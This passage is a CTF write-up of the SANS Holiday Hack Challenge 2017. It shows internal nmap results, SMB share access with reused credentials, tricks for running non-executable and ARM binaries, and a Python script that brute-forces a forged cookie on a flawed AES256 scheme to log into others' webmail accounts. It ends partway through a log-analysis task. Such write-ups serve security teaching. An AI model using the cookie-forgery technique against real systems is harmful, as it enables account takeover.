    Not shown: 998 closed ports
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
    Host is up (0.00016s latency).
    Not shown: 994 closed ports
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT     STATE SERVICE
    22/tcp   open  ssh
    25/tcp   open  smtp
    80/tcp   open  http
    143/tcp  open  imap
    2525/tcp open  ms-v-worlds
    3000/tcp open  ppp

    Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
    Host is up (0.00013s latency).
    Not shown: 996 closed ports
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    389/tcp  open  ldap
    8080/tcp open  http-proxy

    Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
    Host is up (0.00052s latency).
    Not shown: 996 filtered ports
    PORT     STATE SERVICE
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    3389/tcp open  ms-wbt-server

    Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
    Host is up (0.00018s latency).
    Not shown: 960 closed ports, 35 filtered ports
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT     STATE SERVICE
    80/tcp   open  http
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    3389/tcp open  ms-wbt-server

    Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
    Host is up (0.00023s latency).
    Not shown: 996 closed ports
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    4443/tcp open  pharos
    9090/tcp open  zeus-admin

    Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
    Host is up (0.0045s latency).
    Not shown: 998 filtered ports
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT     STATE SERVICE
    80/tcp   open  http
    3389/tcp open  ms-wbt-server

    Nmap done: 256 IP addresses (7 hosts up) scanned in 7.17 seconds

We now have a better view of the internal network.

Third page of *The Great Book*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
North Pole and Beyond: Cryokinetic Magic
----------------------------------------
Cranberry Pi: Yannick's (dirty) solution
........................................

::

                         ___
                        / __'.     .-"""-.
                  .-""-| |  '.'.  / .---. \
                 / .--. \ \___\ \/ /____| |
                / /    \ `-.-;-(`_)_____.-'._
               ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
               | |      /       \ /      `\ `. \       / .-. \
               \ \     |         Y    __...\  \ \     / /   \/
         /\     | |    | .--""--.| .-'      \  '.`---' /
         \ \   / /     |`        \'   _...--.;   '---'`
          \ '-' / jgs  /_..---.._ \ .'\\_     `.
           `--'`      .'    (_)  `'/   (_)     /
                      `._       _.'|         .'
                         ```````    '-...--'`
    My name is Holly Evergreen, and I have a conundrum.
    I broke the candy cane striper, and I'm near throwing a tantrum.
    Assembly lines have stopped since the elves can't get their candy cane fix.
    We hope you can start the striper once again, with your vast bag of tricks.

    Run the CandyCaneStriper executable to complete this challenge.

Ok, so we just have to execute the :code:`CandyCaneStripper` executable, let's
take a look at it:

.. code-block:: console

    elf@cd14b3563680:~$ ls -lh
    total 48K
    -rw-r--r-- 1 root root 45K Dec 15 19:59 CandyCaneStriper

The :code:`CandyCaneStripper` file is **not** marked as executable. So we can't
launch it. Let's :code:`chmod` it to add the executable flag:

.. code-block:: console

    elf@cd14b3563680:~$ chmod +x ./CandyCaneStriper
    elf@cd14b3563680:~$ ls -lh CandyCaneStriper
    -rw-r--r-- 1 root root 45K Dec 15 19:59 CandyCaneStriper

Hmm, it didn't work. Let's take a look at the :code:`chmod` executable:

.. code-block:: console

    elf@cd14b3563680:~$ which chmod
    /bin/chmod
    elf@cd14b3563680:~$ file /bin/chmod
    /bin/chmod: empty

The :code:`chmod` executable is empty, so we don't have it. We can't use the
same trick as for the :code:`find` executable from "Winter Wonder Landing",
because it involded using :code:`chmod` to mark our new program as executable.
We seem to be stuck in a `Catch-22 logic <https://en.wikipedia.org/wiki/Catch-22_(logic)>`__.
So, let's see how we can change our program's attributes, without relying on
:code:`chmod`.

This `Stack Exchange answer <https://unix.stackexchange.com/a/83979>`__ gives
us several possibilities. I used the first one:

.. code-block:: console

    elf@cd14b3563680:~$ cp /bin/ls ./CandyCaneStriper_from_ls
    elf@cd14b3563680:~$ cp ./CandyCaneStriper ./CandyCaneStriper_from_ls
    elf@cd14b3563680:~$ ls -lh CandyCaneStriper_from_ls
    -rwxr-xr-x 1 elf elf 45K Dec 23 18:57 CandyCaneStriper_from_ls
    elf@cd14b3563680:~$ ./CandyCaneStriper_from_ls
                       _..._
                     .'\\ //`,
                    /\\.'``'.=",
                   / \/     ;==|
                  /\\/    .'\`,`
                 / \/     `""`
                /\\/
               /\\/
              /\ /
             /\\/
            /`\/
            \\/
             `
    The candy cane striping machine is up and running!

Cranberry Pi: the "official" solution
.....................................

Having managed to execute the program, I decided to take a look at `Holly
Evergreen's Twitter profile <https://twitter.com/GreenesterElf>`__. In `this
tweet <https://twitter.com/GreenesterElf/status/938544194070634496>`__, she
points to a `Super User answer <https://superuser.com/questions/341439/can-i-execute-a-linux-binary-without-the-execute-permission-bit-being-set>`__,
which explains how to execute a program that is not marked as executable.

The accepted answer says that we can use the program linker/loader as an
interpreter. Let's give it a try:

.. code-block:: console

    elf@fea39a7c28e3:~$ ls -lh ./CandyCaneStriper
    -rw-r--r-- 1 root root 45K Dec 15 19:59 ./CandyCaneStriper
    elf@fea39a7c28e3:~$ /lib/x86_64-linux-gnu/ld-2.23.so ./CandyCaneStriper
                       _..._
                     .'\\ //`,
                    /\\.'``'.=",
                   / \/     ;==|
                  /\\/    .'\`,`
                 / \/     `""`
                /\\/
               /\\/
              /\ /
             /\\/
            /`\/
            \\/
             `
    The candy cane striping machine is up and running!

And it worked, indeed! TIL you can execute a program without it being marked
as executable.

Redirecting the snowball
........................

Since we managed to execute the program, we get a new tool: the Thermite, which
can melts the snowball, reduce its size, and thus modify its speed.

.. image:: /images/sans-christmas-challenge-2017/cryokinetic_magic_terminal.png
    :alt: cryokinetic_magic_terminal.png
    :align: center

Now here's the layout I used to redirect the snowball:

.. image:: /images/sans-christmas-challenge-2017/cryokinetic_magic_snowball.gif
    :alt: cryokinetic_magic_snowball.gif
    :align: center

North Pole Christmas Town infrastructure: SMB server
----------------------------------------------------

If we take a look at the :code:`nmap` scan, we can see that a server called
:code:`hhc17-smb-server.c.holidayhack2017.internal`. This must be an SMB
server used to share some files. Let's try to connect to it using Alabaster
Snowball's credentials. To do this, I'm using :code:`proxychains`, and
`@byt3bl33d3r <https://twitter.com/byt3bl33d3r>`__'s excellent
:code:`CrackMapExec`:

.. code-block:: console
    :hl_lines: 11

    $ proxychains cme 10.142.0.7 -u alabaster_snowball -p stream_unhappy_buy_loss --shares
    ProxyChains-3.1 (http://proxychains.sf.net)
    |S-chain|-<>-127.0.0.1:4242-<><>-10.142.0.7:445-<><>-OK
    CME          10.142.0.7:445 HHC17-EMI       [*] Windows 10.0 Build 14393 (name:HHC17-EMI) (domain:HHC17-EMI)
    |S-chain|-<>-127.0.0.1:4242-<><>-10.142.0.7:445-<><>-OK
    |S-chain|-<>-127.0.0.1:4242-<><>-10.142.0.7:445-<><>-OK
    CME          10.142.0.7:445 HHC17-EMI       [+] HHC17-EMI\alabaster_snowball:stream_unhappy_buy_loss
    CME          10.142.0.7:445 HHC17-EMI       [+] Enumerating shares
    CME          10.142.0.7:445 HHC17-EMI       SHARE           Permissions
    CME          10.142.0.7:445 HHC17-EMI       -----           -----------
    CME          10.142.0.7:445 HHC17-EMI       FileStor        READ
    CME          10.142.0.7:445 HHC17-EMI       ADMIN$          NO ACCESS
    CME          10.142.0.7:445 HHC17-EMI       IPC$            READ
    CME          10.142.0.7:445 HHC17-EMI       C$              NO ACCESS

Hmm, we have read access to the :code:`FileStor` share. Let's connect to it.
I'm using `impacket <https://github.com/CoreSecurity/impacket>`__'s
:code:`smbclient.py`:

.. code-block:: console
    :hl_lines: 12

    $ proxychains smbclient.py alabaster_snowball:stream_unhappy_buy_loss@10.142.0.7
    ProxyChains-3.1 (http://proxychains.sf.net)
    Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies

    |S-chain|-<>-127.0.0.1:4242-<><>-10.142.0.7:445-<><>-OK
    Type help for list of commands
    # use FileStor
    # ls
    drw-rw-rw-          0  Mon Dec 25 05:09:11 2017 .
    drw-rw-rw-          0  Mon Dec 25 05:09:11 2017 ..
    -rw-rw-rw-     255520  Mon Dec 25 05:09:28 2017 BOLO - Munchkin Mole Report.docx
    -rw-rw-rw-    1275756  Mon Dec  4 21:04:34 2017 GreatBookPage3.pdf
    -rw-rw-rw-     133295  Wed Dec  6 22:47:47 2017 MEMO - Password Policy Reminder.docx
    -rw-rw-rw-      10245  Wed Dec  6 23:28:21 2017 Naughty and Nice List.csv
    -rw-rw-rw-      60344  Wed Dec  6 22:51:47 2017 Naughty and Nice List.docx

Among other files that may be useful later, we find the `third page to The
Great Book </docs/sans-christmas-challenge-2017/GreatBookPage3.pdf>`__
(sha256: :code:`6b99d47103d4030e643c8073dfab0915b0bf1a265c32035ec604148abd49d64e`):

    The Great Schism

    Many centuries ago, the Little People of Oz were united - one people
    sharing peace and laughter all the way. But then, tragedy struck - The
    Great Schism split the community into two bitterly opposed factions: the
    Munchkins and the Elves. The original cause of this acrimonious division
    has long been forgotten.

    As The Great Schism escalated from verbal arguments to fist fights to the
    rise of actual armed militias, the Wizard knew he had to act. He reached
    out to his good friend, Santa Claus, who at the time was setting up a
    worldwide gift distribution operation at the North Pole. To avoid the
    near-certain bloodshed of an Oz-wide civil war, the Wizard and Santa agreed
    that they would relocate the Elven faction to the North, where they would
    help Santa manufacture presents and run the North Pole's infrastructure.
    The Munchkins would remain in Oz, living as before, but viewing the Elves'
    departure as a banishment. The Elves themselves regard their move as
    a magnanimous and voluntary relocation to the North Pole, seeking refuge
    from marauding Munchkins.

    Sadly, although violence between the Munchkins and the Elves was thwarted,
    there remains a seething hatred between the two peoples. Despite the best
    efforts of Santa and the Wizard of Oz, anti-Elf propaganda appears from
    time to time in Oz, as does anti-Munchkin sentiment in the North Pole.
    Indeed, the two peoples remain in a perpetual state of cold ward. Sadly,
    the chilling after-affects of The Great Schism are felt to this very day.

Fourth page of *The Great Book*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
North Pole and Beyond: There's Snow Place Like Home
---------------------------------------------------
Cranberry Pi
............

::


                                 ______
                              .-"""".._'.       _,##
                       _..__ |.-"""-.|  |   _,##'`-._
                      (_____)||_____||  |_,##'`-._,##'`
                      _|   |.;-""-.  |  |#'`-._,##'`
                   _.;_ `--' `\    \ |.'`\._,##'`
                  /.-.\ `\     |.-";.`_, |##'`
                  |\__/   | _..;__  |'-' /
                  '.____.'_.-`)\--' /'-'`
                   //||\\(_.-'_,'-'`
                 (`-...-')_,##'`
          jgs _,##`-..,-;##`
           _,##'`-._,##'`
        _,##'`-._,##'`
          `-._,##'`
    My name is Pepper Minstix, and I need your help with my plight.
    I've crashed the Christmas toy train, for which I am quite contrite.
    I should not have interfered, hacking it was foolish in hindsight.
    If you can get it running again, I will reward you with a gift of delight.

Alright, once again, we're supposed to execute a program. Let's see:

.. code-block:: console

    elf@36ff87294cc6:~$ ls -lh
    total 444K
    -rwxr-xr-x 1 root root 444K Dec  7 18:43 trainstartup
    elf@a6b0a5dfef57:~$ ./trainstartup
    bash: ./trainstartup: cannot execute binary file: Exec format error
    elf@a6b0a5dfef57:~$ file ./trainstartup
    ./trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
    elf@a6b0a5dfef57:~$ uname -a
    Linux a6b0a5dfef57 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux

Hmm, just like for the :code:`find` executable in "Winter Wonder Landing",
we're stuck with an ARM program, while we're running on an Intel x64 processor.
However, we can't replace this program with an x64 version, since it's a
custom program! We must find a way to execute ARM on an Intel x64 processor.

This usually means that we have to use some kind of virtualization solution.
One virtualization solution that works in CLI, and can launch program
independently, without having to virtualize a whole OS is QEMU. Let's see if
the machine has QEMU:

.. code-block:: console
    :hl_lines: 2

    elf@a6b0a5dfef57:~$ find / -name 'qemu*' 2> /dev/null
    /usr/bin/qemu-arm
    /usr/bin/qemu-alpha
    /usr/bin/qemu-sh4eb
    /usr/bin/qemu-mips
    /usr/bin/qemu-aarch64
    /usr/bin/qemu-sparc32plus
    /usr/bin/qemu-m68k
    /usr/bin/qemu-microblazeel
    /usr/bin/qemu-ppc64
    /usr/bin/qemu-mipsn32
    /usr/bin/qemu-microblaze
    /usr/bin/qemu-mips64
    /usr/bin/qemu-sparc64
    /usr/bin/qemu-s390x
    /usr/bin/qemu-mips64el
    /usr/bin/qemu-mipsel
    /usr/bin/qemu-cris
    /usr/bin/qemu-armeb
    /usr/bin/qemu-sparc
    /usr/bin/qemu-unicore32
    /usr/bin/qemu-x86_64
    /usr/bin/qemu-mipsn32el
    /usr/bin/qemu-ppc64abi32
    /usr/bin/qemu-sh4
    /usr/bin/qemu-i386
    /usr/bin/qemu-ppc
    /usr/bin/qemu-or32
    [snip]

Yes, :code:`qemu-arm` is present, we can try and launch our program:

.. code-block:: console

    elf@a6b0a5dfef57:~$ /usr/bin/qemu-arm ./trainstartup
    Starting up...

        Merry Christmas
        Merry Christmas
    v
    >*<
    ^
    /o\
    /   \               @.·
    /~~   \                .
    / ° ~~  \         · .
    /      ~~ \       ◆  ·
    /     °   ~~\    ·     0
    /~~           \   .─··─ · o
                 /°  ~~  .*· · . \  ├──┼──┤
                  │  ──┬─°─┬─°─°─°─ └──┴──┘
    ≠==≠==≠==≠==──┼──=≠     ≠=≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠===≠
                  │   /└───┘\┌───┐       ┌┐
                             └───┘    /▒▒▒▒
    ≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠
    You did it! Thank you!

Redirecting the snowball
........................

Since we managed to execute the program, we're given an object: Jam, which
does... something? I dunno, but apparently it should not be confused with
reindeer droppings.

.. image:: /images/sans-christmas-challenge-2017/there_s_snow_place_like_home_terminal.png
    :alt: there_s_snow_place_like_home_terminal.png
    :align: center

Now here's the layout I used to redirect the snowball:

.. image:: /images/sans-christmas-challenge-2017/there_s_snow_place_like_home_snowball.gif
    :alt: there_s_snow_place_like_home_snowball.gif
    :align: center

North Pole Christmas Town infrastructure: Elf Web Access
--------------------------------------------------------

If we take another look at the :code:`nmap` scan result, we can find a server
called :code:`mail.northpolechristmastown.com`. This is obviously the North
Pole mail server. Let's see what we can find.

If we try to connect with Alabaster's password, we get an :code:`Incorrect
password` message. Great, the guy reuses his password for his MySQL account,
his system account, and his SMB account, but not his mail account. Let's find
another way.

.. image:: /images/sans-christmas-challenge-2017/ewa_failed_login.png
    :alt: ewa_failed_login.png
    :align: center

After trying to bypass authentication for quite some time, I decided to go
back to basic recon. By looking at the source code of the application, we
find a reference to a webpage called :code:`account.html`:

.. code-block:: js
    :hl_lines: 14

    // File custom.js
    function login() {
        var address = $('#email').val().trim();
        var passw = $('#password').val().trim();
        if (address && passw && address.match(/[\w\_\-\.]+\@[\w\_\-\.]+\.\w\w\w?\w?/g) !== null) {
            $.post( "login.js", { email: address, password: passw }).done(function( result ) {
                //RETURN A JSON bool value of true if the email and password is correct. false if incorrect
                if (result.bool) {
                    $('#email').val('');
                    $('#password').val('');
                    Materialize.toast('Correct. Logging in now!', 4000);
                    setTimeout(function(){
                        //redirect to home.html. This needs to be locked down by cookies!
                        window.location.href = 'account.html';
                    }, 1000);
                } else {
                    Materialize.toast(result.result, 4000);
                }
            }).fail(function(error) {
                Materialize.toast('Error: '+error.status + " " + error.statusText, 4000);
            })
        } else {
            Materialize.toast('You must put in a correct email and password!', 4000);
        }
    }

But trying to go directly to this page just redirects us to the login page.
Let's continue our recon. Here's what we find in the :code:`robots.txt` file:

.. code-block:: http
    :hl_lines: 3

    GET /robots.txt HTTP/1.1
    Host: 10.142.0.5
    Cookie: EWA={"name":"GUEST","plaintext":"","ciphertext":""}
    Connection: close

.. code-block:: http
    :hl_lines: 7 10

    HTTP/1.1 200 OK
    Server: nginx/1.10.3 (Ubuntu)
    Date: Thu, 28 Dec 2017 20:29:07 GMT
    Content-Type: text/plain; charset=UTF-8
    Content-Length: 37
    Connection: close
    X-Powered-By: Express

    User-agent: *
    Disallow: /cookie.txt

Couple of interesting things. First, the application set us a cookie called
:code:`EWA`, with what seems to be our access level. I tried replaying the
cookie with values such as :code:`ADMIN`, etc. but it didn't work. Second, the
application is using the Express framework, which is based on NodeJS. We
now know the backend of the application. And finally, there is a file called
:code:`cookie.txt` in the application webroot, and the developper didn't want
this file to be indexed by search engine bots. So I guess it must be
interesting! Let's see.

The file contains the following Javascript code:

.. code-block:: js

    //FOUND THESE FOR creating and validating cookies. Going to use this in node js
        function cookie_maker(username, callback){
            var key = 'need to put any length key in here';
            //randomly generates a string of 5 characters
            var plaintext = rando_string(5)
            //makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
            //Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
            var ciphertext = aes256.encrypt(key, plaintext).replace(/\=/g,'');
            //Setting the values of the cookie.
            var acookie = ['IOTECHWEBMAIL',JSON.stringify({"name":username, "plaintext":plaintext,  "ciphertext":ciphertext}), { maxAge: 86400000, httpOnly: true, encode: String }]
            return callback(acookie);
        };
        function cookie_checker(req, callback){
            try{
                var key = 'need to put any length key in here';
                //Retrieving the cookie from the request headers and parsing it as JSON
                var thecookie = JSON.parse(req.cookies.IOTECHWEBMAIL);
                //Retrieving the cipher text
                var ciphertext = thecookie.ciphertext;
                //Retrievingin the username
                var username = thecookie.name
                //retrieving the plaintext
                var plaintext = aes256.decrypt(key, ciphertext);
                //If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
                if (plaintext === thecookie.plaintext) {
                    return callback(true, username);
                } else {
                    return callback(false, '');
                }
            } catch (e) {
                console.log(e);
                return callback(false, '');
            }
        };

So, we seem to have found the code that is use to generate the :code:`EWA`
cookie. Here's how it seems to work:

1. The server generates a five-letter random string (variable :code:`plaintext`).

2. This string is encrypted using AES256 (variable :code:`ciphertext`, with a fixed key (variable :code:`key`).

3. The username, the random string, and its encrypted value, are put in the cookie.

4. To check the cookie, the server decrypts the encrypted value, and compares it to the random string sent in the cookie.

At first, I tried generating a cookie, using the key :code:`need to put any length key in here`,
hoping that the developper had not changed this section of the source code, but
it didn't work. So we don't know the key. But there are still some glaring
errors in this cookie generation code.

First, let's take a look at the `aes256 NodeJS module <https://www.npmjs.com/package/aes256>`__.
I installed NodeJS and this module, and played around with it:

.. code-block:: js

    > var aes256 = require('aes256');
    undefined
    > var key = 'my milkshake brings all the boys to the yard';
    undefined
    > var plaintext = '1337';
    undefined
    > aes256.encrypt(key, plaintext)
    'L07kb9VSHbavnunjI/4aom8KcS4='

Let's take a look at our ciphertext:

.. code-block:: console

    $  echo 'L07kb9VSHbavnunjI/4aom8KcS4=' | base64 -d | hexdump -C
    00000000  2f 4e e4 6f d5 52 1d b6  af 9e e9 e3 23 fe 1a a2  |/N.o.R......#...|
    00000010  6f 0a 71 2e                                       |o.q.|
    00000014

Hmmm, our output is 20 bytes, which is not a multiple of AES block-size. This
is weird. The first block of our ciphertext (16 bytes) must be the
initialization vector, which leaves a 4-byte block. Incidently, 4 bytes is
exactly the size of our plaintext. After several manual tries, I confirmed that
the plaintext and the ciphertext have the same size, which is the first oops.

The second oops is that the cookie verification code does not perform any check
on the payload sent in the cookie. So it will happily accept one-byte long
payload :strike:`(but unfortunately, not empty payload)` **(it actually does,
see after)**.

So, if we send a one-byte long payload, there are only 256 possible values for
the ciphertext, which is easily bruteforceable on line. Here's a Python script
that will try to find a valid cookie:

.. code-block:: python

    #!/usr/bin/env python3

    import base64
    import requests
    import time

    def main():
        # The URL we try to access
        url = 'http://10.142.0.5/account.html'

        # Our cookie template, with a one-byte long plaintext
        cookie_template = '{{"name":"alabaster.snowball@northpolechristmastown.com","plaintext":"a","ciphertext":"{}"}}'

        # Our arbitrary IV
        iv = b'\x90' * 16

        for candidate in range(256):
            # We create our candidate cipher text, by appending the one-byte value
            # to our IV, and base64 encoding it
            ciphertext = base64.b64encode(iv + bytes([candidate])).decode('utf8')

            # We then create our cookie, and get the wanted page
            cookies = {'EWA': cookie_template.format(ciphertext)}
            r = requests.get(url, cookies=cookies)

            # If we get a positive return, we output the cookie
            if r.status_code == 200 and r.text != '<script>window.location.href=\'/\'</script>'::
                print(cookies)
                break

    if __name__ == '__main__':
        main()

We launch our script through :code:`proxychains` and...

.. code-block:: console

    $ proxychains ./cookie_finder.py
    ProxyChains-3.1 (http://proxychains.sf.net)
    |S-chain|-<>-127.0.0.1:4242-<><>-10.142.0.5:80-<><>-OK
    [snip]
    {'EWA': '{"name":"alabaster.snowball@northpolechristmastown.com","plaintext":"a","ciphertext":"kJCQkJCQkJCQkJCQkJCQkGk="}'}

Bingo! We get a valid cookie for Alabaster's account!

**<Errata>**

After solving this part, I checked the hints given by the Elf of this level,
Pepper Minstix:

    AES256? Honestly, I don't know much about it, but Alabaster explained the
    basic idea and it sounded easy. During decryption, the first 16 bytes are
    removed and used as the initialization vector or "IV." Then the IV + the
    secret key are used with AES256 to decrypt the remaining bytes of the
    encrypted string.  

    Hmmm. That's a good question, I'm not sure what would happen if the
    encrypted string was only 16 bytes long.

So the system does in fact accept empty :code:`plaintext` variables, with
any :code:`ciphertext` that is 16-byte long. So using this cookie works:
:code:`{"name":"alabaster.snowball@northpolechristmastown.com","plaintext":"","ciphertext":"QUFBQUFBQUFBQUFBQUFBQQo="}`.

I was sure to have checked this, but obviously I'm mistaken (that's an oops for
me)!

**</Errata>**

Alright, now we have a valid cookie for Alabaster's account. Or any account
really. This is the third oops: there's no link between the :code:`name` set in
the cookie, and the :code:`plaintext` and :code:`ciphertext` variables. So now
that we have found a valid ciphertext for our plaintext :code:`a`, we can put
anything we want in the :code:`name` variable, such as
:code:`admin@northpolechristmastown.com`, and we'll be logged into the given
account:

.. image:: /images/sans-christmas-challenge-2017/ewa_alabaster_account.png
    :alt: ewa_alabaster_account.png
    :align: center

If we snoop around Alabaster's mailbox, we find this email:

   **From:** holly.evergreen@northpolechristmastown.com

   **To:** all@northpolechristmastown.com

   **Subject:** Lost book page

   Hey Santa,

   Found this lying around. Figured you needed it.

   http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf

   :)

   -Holly

We get a link to the `fourth page of The Great Book </docs/sans-christmas-challenge-2017/GreatBookPage4_893jt91md2.pdf>`__
(sha256: :code:`6afe9f8c7dc8a392b6d853a05f1c1ce67b490633e3aa6c22faa3b1936f1ceed0`):

    The Rise of the Lollipop Guild

    As tensions escalated immediately before The Great Schism, outright
    fistfights erupted in the streets of the Emerald City as the most
    radicalized Elves and Munchkins battled for turf. In those early days, the
    small-scale skirmishes were disorganized and chaotic. But as hostilities
    and violence continued to grow, organized groups of elite fighters emerged
    on each side to take control of the militias. One particularly notherworthy
    band of commandos named itself the "Lollipop Guild".

    Today, despite its sweet candy-themed name, the Guild's mission is by no
    means sugar coated. The official, stated focus of this liliputian force is
    to apply elite military tactics to defend Oz against all Elven aggression.
    What's more, it's also believed (at least among the Elves) that the
    Lollipop Guild engages in offensive operations against the North Pole, both
    from a cyber and kinetic perspective. The Elves consider the Lollipop Guild
    to be a terrorist organization. Indeed, the North Pole Elven Blue Team
    toils year-round defending the computer and network infrastructure of the
    North Pole from attack. Their biggest fear is that the Lollipop Guild will
    somehow disrupt or destroy the North Pole's biggest production of the year
    - Santa's Christmas Day present delivery operation. The North Pole Blue
    Team is on extremely high alert throughout Christmas Eve, and exhaustive
    period of analysis and active defense this team refers to as "Blue
    Christmas".

    Although it has never been proven, the Elves allege that the Lollipop Guild
    has infiltrated its operatives among the North Pole population, cleverly
    disguising these nefarious interlopers as Elves. According to these rumors,
    so-called Munchkin Moles mingle among even the Elven Elite. Because Elves
    and Munchkins look identical, Elven leadership remains confounded about
    whether Munchkin Moles actually exist. Yet, rumors persist.

Fifth page of *The Great Book*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The fifth page is located in North Pole and Beyond level. We must use the
giant falling snowball to collect it. But let's solve the Cranberry Pi
challenge first.

North Pole and Beyond: Bumbles Bounce
-------------------------------------
Cranberry Pi
............

::

                               ._    _.
                               (_)  (_)                  <> \  / <>
                                .\::/.                   \_\/  \/_/
               .:.          _.=._\\//_.=._                  \\//
          ..   \o/   ..      '=' //\\ '='             _<>_\_\<>/_/_<>_
          :o|   |   |o:         '/::\'                 <> / /<>\ \ <>
           ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
               >O<             '      '     /_/  \_\     / /\  /\ \
           _ .' . '. _                        \\//       <> /  \ <>
          :o|   |   |o:                   /\_\\><//_/\
          ''   /o\   ''     '.|  |.'      \/ //><\\ \/
               ':'        . ~~\  /~~ .       _//\\_
    jgs                   _\_._\/_._/_      \_\  /_/
                           / ' /\ ' \                   \o/
           o              ' __/  \__ '              _o/.:|:.\o_
      o    :    o         ' .'|  |'.                  .\:|:/.
        '.\'/.'                 .                 -=>>::>o<::<<=-
        :->@<-:                 :                   _ '/:|:\' _
        .'/.\'.           '.___/*\___.'              o\':|:'/o
      o    :    o           \* \ / */                   /o\
           o                 >--X--<
                            /*_/ \_*\
                          .'   \*/   '.
                                :
                                '
    Minty Candycane here, I need your help straight away.
    We're having an argument about browser popularity stray.
    Use the supplied log file from our server in the North Pole.
    Identifying the least-popular browser is your noteworthy goal.

Alright, it seems we just have to analyze and find the least popular browser
in a log file:

.. code-block:: console

    elf@7283fcc58ff6:~$ ls -lh
    total 29M
    -rw-r--r-- 1 root root  24M Dec  4 17:11 access.log
    -rwxr-xr-x 1 root root 5.0M Dec 11 17:31 runtoanswer
    elf@7283fcc58ff6:~$ head access.log
    XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
    XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] "GET /robots.txt HTTP/1.1" 404 5 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
    XX.YY.89.151 - - [19/Nov/2017:07:13:03 -0500] "GET /img/common/apple-touch-icon-57x57.png HTTP/1.1" 200 3677 "-" "Slack-ImgProxy (+https://api.slack.com/robots)"
    XX.YY.66.201 - - [19/Nov/2017:07:22:12 -0500] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
    XX.YY.45.77 - - [19/Nov/2017:07:43:08 -0500] "GET /img/common/apple-touch-icon-57x57.png HTTP/1.1" 200 3677 "-" "Slack-ImgProxy (+https://api.slack.com/robots)"
    XX.YY.201.12 - - [19/Nov/2017:08:21:10 -0500] "GET /manager/html HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
    XX.YY.218.124 - - [19/Nov/2017:08:22:09 -0500] "GET /img/common/favicon-128.png HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
    XX.YY.68.152 - - [19/Nov/2017:08:43:27 -0500] "GET /img/common/apple-touch-icon-57x57.png HTTP/1.1" 200 3677 "-" "Slack-ImgProxy (+https://api.slack.com/robots)"
    XX.YY.236.170 - - [19/Nov/2017:08:48:39 -0500] "GET /img/common/apple-touch-icon-57x57.png HTTP/1.1" 200 3677 "-" "slack/2.47.0.7352 (motorola Moto G (4); Android 7.0)"
    XX.YY.11.135 - - [19/Nov/2017:08:56:32 -0500] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0"

We can see that the last column holds the user-agent. We can also observe that
the user-agent is just after the fifth double-quote on the line. So, if we use
the :code:`cut` command, with :code:`"` as a separator, we will get the
user-agent by asking for the sixth field:

.. code-block:: console

    elf@7283fcc58ff6:~$ cut -d'"' -f 6 access.log
    Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)
    Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)
    Slack-ImgProxy (+https://api.slack.com/robots)
    Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)
    Slack-ImgProxy (+https://api.slack.com/robots)
    Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
    Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
    Slack-ImgProxy (+https://api.slack.com/robots)
    slack/2.47.0.7352 (motorola Moto G (4); Android 7.0)
    Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
    [snip]

